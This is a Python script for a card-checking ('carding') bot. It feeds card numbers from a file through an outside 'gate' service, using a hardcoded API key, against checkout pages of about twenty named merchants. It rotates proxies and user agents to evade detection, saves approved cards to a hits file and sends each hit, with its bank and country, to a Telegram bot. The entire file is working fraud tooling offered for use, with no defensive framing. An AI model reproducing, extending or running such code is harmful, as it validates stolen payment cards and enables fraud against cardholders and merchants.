import sys, os, time, random, requests, threading, re, uuid, base64, asyncio, json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, unquote
from fake_useragent import UserAgent
from colorama import init, Fore, Style
from flask import Flask

# --- RENDER SERVER SETUP ---
app = Flask(__name__)
@app.route('/')
def health_check():
    return "Engine V30 Target-Master is ACTIVE"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

init(autoreset=True)

class UltimateMasterV30:
    def __init__(self):
        self.lock = threading.Lock()
        self.is_killed = False
        self.api_key = "toji_Uymnmw4l1C5BccQE"
        self.gate_base = "http://tojis.site:8080/gatev2"
        self.ua = UserAgent()
        # Environment se tokens uthayega
        self.bot_token = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN") 
        self.chat_id = os.environ.get("CHAT_ID", "YOUR_CHAT_ID")     
        
        self.proxies_list = self.load_proxies()
        self.mode = "Standard" 
        
        self.total_hits = 0
        self.total_checked = 0
        
        # --- ALL TARGETS (OLD + NEW) ADDED ---
        self.targets = {
            "TracFone (5/5)": "https://www.tracfone.com/checkout",
            "TheCableCo (5/5)": "https://www.thecableco.com/checkout",
            "Skyway Luggage (4/5)": "https://www.skywayluggage.com/checkout",
            "MSI Global Store": "https://us-store.msi.com/checkout",
            "Canon Americas": "https://myprofile.americas.canon.com",
            "Infinity Support": "https://support.infinityspeakers.com/hc/en-us",
            "Reolink (4/5)": "https://reolink.com/checkout",
            "FinerWorks": "https://finerworks.com/checkout/payment.aspx",
            "CoachCare": "https://dashboard.coachcare.com",
            "Denon": "https://www.denon.com/checkout",
            "Polk Audio": "https://www.polkaudio.com/checkout",
            "Visual Land": "https://visual-land.com/checkout",
            "HTD Speakers": "https://www.htd.com/checkout",
            "O&G Gadgets": "https://www.oandogadgets.com/checkout",
            "Telegram Premium": "https://fragment.com/stars",
            "Instagram/Meta": "https://accountscenter.instagram.com/payments/",
            "Snapchat+": "https://www.snapchat.com/plus",
            "Heroku": "https://dashboard.heroku.com/account/billing",
            "Amazon": "https://www.amazon.com/gp/your-account/",
            "BGMI UC": "https://www.midasbuy.com"
        }

    def print_banner(self):
        os.system('clear' if os.name != 'nt' else 'cls')
        banner = f"""
{Fore.CYAN}  ██████╗ ██████╗ ██████╗  ██████╗ ███████╗██╗     ██╗████████╗███████╗
{Fore.CYAN}  ██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██╔════╝██║     ██║╚══██╔══╝██╔════╝
{Fore.WHITE}  ██████╔╝██████╔╝██║  ██║██║   ██║█████╗  ██║     ██║   ██║   █████╗  
{Fore.WHITE}  ██╔═══╝ ██╔══██╗██║  ██║██║   ██║██╔══╝  ██║     ██║   ██║   ██╔══╝  
{Fore.BLUE}  ██║     ██║  ██║██████╔╝╚██████╔╝███████╗███████╗███████╗██║   ██║   
{Fore.BLUE}  ╚═╝     ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝   ╚═╝   
        {Fore.YELLOW}--- ENGINE V30 | TARGET-MASTER PREMIUM | 2026 ---
        """
        print(banner)
        print(f"{Fore.GREEN}[+] Status: {Fore.WHITE}Online (Render Cloud)")
        print(f"{Fore.GREEN}[+] Gate: {Fore.WHITE}{self.gate_base}")
        print(f"{Fore.GREEN}[+] Active Targets: {Fore.WHITE}{len(self.targets)}")
        print(f"{Fore.RED}{'='*65}")

    def load_proxies(self):
        try:
            if os.path.exists("proxy.txt"):
                with open("proxy.txt", "r") as f:
                    return [line.strip() for line in f if line.strip()]
            return []
        except: return []

    def save_hit_to_file(self, cc_data):
        with self.lock:
            with open("hits.txt", "a") as f:
                f.write(f"{cc_data}\n")

    def get_proxy(self):
        if not self.proxies_list: return None
        proxy = random.choice(self.proxies_list)
        parts = proxy.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            return {"http": f"http://{user}:{pwd}@{ip}:{port}", "https": f"http://{user}:{pwd}@{ip}:{port}"}
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    def get_full_card_info(self, cc):
        try:
            bin_num = cc[:6]
            res = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5).json()
            level = res.get("type", "Unknown").upper()
            country = res.get('country', {}).get('name', 'Unknown')
            emoji = res.get('country', {}).get('emoji', '🌐')
            return {"bank": res.get("bank", {}).get("name", "Unknown"), "level": level, "country": f"{country} {emoji}"}
        except: 
            return {"bank": "Unknown", "level": "Unknown", "country": "Unknown"}

    def send_log(self, msg):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            requests.post(url, json={"chat_id": self.chat_id, "text": msg, "parse_mode": "Markdown"}, timeout=10)
        except: pass

    def process_card(self, cc):
        if self.is_killed: return
        try:
            time.sleep(random.randint(1, 3))
            cc_clean = cc.replace(' ', '').strip()
            if not cc_clean: return
            
            srv_name = random.choice(list(self.targets.keys()))
            current_proxy = self.get_proxy()
            final_gate = f"{self.gate_base}?cc={cc_clean}&key={self.api_key}&sitye={quote(self.targets[srv_name])}"

            resp = requests.get(final_gate, headers={'User-Agent': self.ua.random}, proxies=current_proxy, timeout=50)
            
            self.total_checked += 1
            if any(x in resp.text.lower() for x in ["succeeded", "charged", "success", "approved"]):
                self.total_hits += 1
                info = self.get_full_card_info(cc_clean)
                self.save_hit_to_file(cc_clean)
                
                msg = (
                    f"🚀 *V30 HIT FOUND* 🚀\n\n"
                    f"💳 *Card:* `{cc_clean}`\n"
                    f"🏦 *Bank:* {info['bank']}\n"
                    f"🏆 *Level:* {info['level']}\n"
                    f"📍 *Country:* {info['country']}\n\n"
                    f"🎯 *Target:* `{srv_name}`\n"
                    f"✅ *Status:* LIVE"
                )
                self.send_log(msg)
                print(Fore.GREEN + f"✅ [HIT] {cc_clean} | Target: {srv_name}")
            else:
                print(Fore.RED + f"❌ [DEC] {cc_clean[:16]} | Checked: {self.total_checked}")
        except: pass

    def run(self):
        self.print_banner()
        
        # --- STARTUP TELEGRAM LOG ---
        startup_msg = (
            "🚀 *V30 ENGINE IS ONLINE* 🚀\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "✅ *Status:* Operating Smoothly\n"
            "📦 *Targets:* 20 Platforms Loaded\n"
            "⭐ *New High Rates:* TracFone, MSI, Canon\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "🛰️ *Bot is now checking cards...*"
        )
        self.send_log(startup_msg)
        
        while True:
            cards = []
            if os.path.exists("cards.txt"):
                with open("cards.txt", "r") as f:
                    cards = [line.strip() for line in f if line.strip()]
            
            if not cards:
                time.sleep(10)
                continue

            print(Fore.MAGENTA + f"[*] Loaded {len(cards)} cards. Starting Cycle...")
            with ThreadPoolExecutor(max_workers=5) as executor:
                executor.map(self.process_card, cards)
            
            print(Fore.YELLOW + f"\n[*] Cycle complete. Total Checked: {self.total_checked}")
            time.sleep(300)

if __name__ == "__main__":
    threading.Thread(target=run_web_server, daemon=True).start()
    UltimateMasterV30().run()
